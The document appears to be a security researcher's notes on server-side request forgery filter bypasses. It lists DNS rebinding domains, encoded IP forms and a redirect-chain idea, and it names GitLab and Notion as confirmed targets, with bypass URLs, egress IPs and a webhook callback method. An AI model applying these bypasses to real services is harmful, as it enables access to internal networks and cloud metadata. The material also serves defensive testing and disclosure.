# SSRF DNS Bypass Techniques

Known DNS resolver domains that bypass IP-based URL validation by resolving to arbitrary private IPs.
Includes patterns discovered during GitLab and Vercel AI SDK testing.

## DNS Resolver Services

| Domain | Behavior | Example | Block Status |
|--------|----------|---------|-------------|
| `*.nip.io` | `*.X.X.X.X.nip.io` → `X.X.X.X` | `169.254.169.254.nip.io` → AWS metadata IP | ✅ Works if no DNS resolution |
| `*.sslip.io` | `*.X.X.X.X.sslip.io` → `X.X.X.X` | `127.0.0.1.sslip.io` → localhost | ✅ Same pattern |
| `localtest.me` | Always resolves to `127.0.0.1` | `http://localtest.me/` → localhost | ⚠️ Often specifically blocklisted |
| `lvh.me` | Always resolves to `127.0.0.1` | `http://lvh.me/` → localhost | ⚠️ Often specifically blocklisted |
| `*.loca.lt` | Local tunnel service | Various | ✅ Less known |

## nip.io Variants

The `nip.io` service parses the subdomain as an IP address. Different IP representations work:

| Domain | Resolved IP | Notes |
|--------|-------------|-------|
| `127.0.0.1.nip.io` | `127.0.0.1` | Standard format — often in blocklists |
| `1.0.0.127.nip.io` | `1.0.0.127` | **Inverted octets** — resolves to a public IP (`1.0.0.127`), NOT loopback. Passes URL validation because the resolved IP is not private, but the connection goes to that public IP, not internal services. |
| `0x7f000001.nip.io` | `0.0.0.0` (or fails) | Hex encoded IP — behavior varies by URL validator |
| `2130706433.nip.io` | `0.0.0.0` (or fails) | Decimal IP — same variant |
| `0.nip.io` | Varies | Zero shorthand |
| `65535.nip.io` | Varies | Port shorthand |

**Key insight**: Inverted nip.io formats (`1.0.0.127.nip.io`) can PASS creation-time validation because they resolve to public IPs, but the attack doesn't work because the connection goes to a public server, not internal infrastructure. They're useful for testing whether a system makes live connections (confirms SSRF plumbing) but not for actual exploitation.

## IP Formats Normalized by `new URL()` (Node.js)

| Input | URL.hostname | Notes |
|-------|-------------|-------|
| `0x7f000001` | `127.0.0.1` | Hex encoded IP |
| `2130706433` | `127.0.0.1` | Decimal IP |
| `0x7f.0x0.0x0.0x1` | `127.0.0.1` | Hex dotted |
| `127.1` | `127.0.0.1` | Shorthand |
| `0` | `0.0.0.0` | Zero shorthand |

These are normalized by Node.js's URL parser, so `validateDownloadUrl` that uses `new URL(url).hostname` will see the resolved IP and can block it — but the DNS bypass domains slip through because the hostname string is a domain name, not an IP.

## Multi-Hop Redirect SSRF

When the target validates URLs after redirects, a single redirect is caught. But a **multi-hop chain** might bypass:

Chain: `public-url → public-intermediary → private-ip`

The validation after redirect only calls `validateDownloadUrl(response.url)` once — on the FINAL URL after all redirects. If an attacker crafts a chain where:
1. First redirect goes to another public URL (passes URL parsing check)
2. Second redirect is HTTP to internal IP
3. The chain resolves as a single redirect hop to the second URL

This is **untested** and depends on how the HTTP library handles redirect chains (e.g., does it re-validate each hop or only the final URL?).

## GitLab URL Validation Bypass (Self-Hosted)

On gitlab.com, URL validation happens in TWO phases:
- **Creation time**: `dns_rebind_protection: false` (default in `AddressableUrlValidator`)
- **Execution time**: `dns_rebind_protection: true` (default in `UrlBlocker`)

On **self-hosted GitLab instances** (in scope!):
- If `dns_rebinding_protection_enabled?` is `false` → execution phase also uses `dns_rebind_protection: false` → fully exploitable SSRF
- If `allow_local_requests_from_web_hooks_and_services?` is `true` → localhost/private IPs are explicitly allowed → trivial SSRF

## GitLab — Confirmed Bypass URLs

These URLs passed creation-time validation on gitlab.com (webhook/push mirror API):

| URL | Status | Why |
|-----|--------|-----|
| `http://localhost:8080/test` | ❌ Blocked | Literal localhost in blocklist |
| `http://127.0.0.1.nip.io:8080/test` | ❌ Blocked | DNS resolves to 127.0.0.1 → loopback check |
| `http://localtest.me:8080/test` | ❌ Blocked | In blocklist |
| `http://lvh.me:8080/test` | ❌ Blocked | In blocklist |
| `http://1.0.0.127.nip.io:8080/test` | ✅ **Passed** | DNS resolves to public IP `1.0.0.127` |
| `http://0x7f000001.nip.io:8080/test` | ✅ **Passed** | DNS resolves to non-loopback |
| `http://2130706433.nip.io:8080/test` | ✅ **Passed** | DNS resolves to non-loopback |
| `http://65535.nip.io:8080/test` | ✅ **Passed** | DNS resolves to non-loopback |
| `http://0.nip.io:8080/test` | ✅ **Passed** | DNS resolves to non-loopback |

All passed URLs remain `alert_status: "executable"` — GitLab actively attempts connections.

## SSRF Confirmation Methodology

### 1. Create a webhook endpoint
```bash
curl -s -X POST "https://webhook.site/token" -H "Accept: application/json"
# Returns: {"uuid": "..."}
# Webhook URL: https://webhook.site/{uuid}
```

### 2. Inject the webhook URL into the target
Create an embed, bookmark, image, or file block pointing to the webhook URL.

### 3. Check for incoming requests
```python
import urllib.request, json
url = "https://webhook.site/token/{uuid}/requests?sorting=newest"
req = urllib.request.Request(url)
req.add_header('Accept', 'application/json')
resp = urllib.request.urlopen(req)
data = json.loads(resp.read())
for r in data.get('data', []):
    print(f"  {r.get('method')} {r.get('url')} IP:{r.get('ip')} UA:{r.get('headers',{}).get('user-agent','')}")
```

### 4. Analyze the requests
- **IP address**: Where the request originated (internal infrastructure)
- **User-Agent**: Which service/component made the request
- **Referer**: Context of the request
- **Method**: HEAD vs GET indicates probe vs content fetch

## Targets Confirmed Vulnerable

| Target | Service | User-Agent | IP Range |
|--------|---------|------------|----------|
| **Notion Embed** | NotionEmbedder (HEAD) | `NotionEmbedder` | `131.149.232.x` |
| **Notion Embed** | Iframely (GET) | `Iframely/1.3.1 (+https://iframely.com/docs/about) Notion` | `44.199.21.x`, `100.29.x.x` |
| **Notion File Upload** | notion-api (HEAD) | `notion-api` | `131.149.232.x` |
| **Notion File Upload** | notion (GET) | `notion` | `131.149.232.x` |
| **GitLab Webhook** | GitLab | `GitLab/19.1.0-pre` | `34.74.226.28` (GCP us-east1) |
